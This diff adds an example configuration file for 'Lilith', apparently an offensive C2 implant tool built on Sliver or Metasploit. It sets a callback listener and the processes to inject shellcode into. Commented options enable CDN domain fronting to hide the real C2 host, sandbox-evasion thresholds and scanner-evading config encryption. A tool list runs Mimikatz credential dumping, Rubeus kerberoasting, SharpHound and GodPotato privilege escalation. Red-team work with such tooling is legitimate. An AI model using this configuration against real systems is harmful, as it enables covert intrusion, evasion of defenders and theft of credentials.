@@ -1,0 +1,54 @@
+# Lilith engagement configuration
+# cp engagement.yaml.example engagement.yaml && edit before use
+
+lhost: 10.10.14.1
+lport: 4444
+http_port: 8443
+framework: sliver        # sliver or msf
+proto: mtls              # sliver: mtls | http | https
+type: beacon             # sliver: beacon | session
+
+# Process to inject shellcode into (baked into runner at build time)
+# Options: RuntimeBroker.exe, explorer.exe, svchost.exe, mmc.exe, WmiPrvSE.exe
+injection_profile: RuntimeBroker.exe
+
+# Task 13 — Domain fronting (optional).
+# When set, WinHTTP connects to the CDN IP/host (front_host) but sends
+# Host: front_domain in the HTTP request. The CDN forwards to lhost based on the
+# Host header.  TLS SNI = front_sni (CDN edge cert) so network inspection sees
+# only the CDN hostname, never the real C2 host.
+#
+# Setup: put lhost behind Cloudflare/Azure CDN, create a CNAME.
+# Uncomment and fill in the three fields to enable.
+#
+# front_host:   "cdn.cloudflare.com"    # CDN edge to connect to (TCP/TLS target)
+# front_sni:    "cdn.cloudflare.com"    # SNI in TLS ClientHello (matches CDN cert)
+# front_domain: "your-c2-fqdn.com"     # Host: header forwarded by CDN to lhost
+
+# Task 14 sandbox evasion thresholds (tunable)
+# sandbox_min_uptime_ms: 300000    # default 5 min
+# sandbox_min_processes: 50        # default 50
+
+# Task 15 — Config protection: how long (seconds) config values stay decoded in memory
+# Lower = safer (fewer ms exposed to scanner), but adds CPU overhead on each poll
+# config_decode_window_s: 0        # 0 = re-encrypt immediately after URL build (default)
+
+tools:
+  SharpUp:
+    params: "audit"
+  Rubeus:
+    params: "kerberoast /nowrap"
+  Seatbelt:
+    params: "-group=all -full"
+  Mimikatz:
+    params: "privilege::debug sekurlsa::logonpasswords exit"
+  SharpHound:
+    params: "-c All --memcache"
+  GodPotato:
+    params: '-cmd "cmd /c whoami"'
+  Certify:
+    params: "find /vulnerable"
+  Whisker:
+    params: "list"
+  SharpDPAPI:
+    params: "triage"
